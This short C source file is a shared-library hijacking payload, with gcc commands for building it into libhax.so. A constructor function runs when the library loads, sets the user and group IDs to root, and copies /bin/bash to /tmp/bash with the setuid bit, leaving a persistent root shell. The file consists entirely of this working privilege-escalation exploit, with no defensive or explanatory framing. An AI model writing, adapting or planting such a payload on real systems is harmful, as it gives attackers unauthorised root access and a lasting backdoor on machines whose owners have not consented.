#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> 

// gcc -Wall -fPIC -c -o hax.o simpleLdLibraryHijacking.c
// gcc -shared -o libhax.so hax.o
static void runmahpayload() __attribute__((constructor)); 

void runmahpayload() {
	setuid(0);
	setgid(0);
	printf("Shared Library Hijacking \n");
	system("cp /bin/bash /tmp/bash; chmod +s /tmp/bash");
}
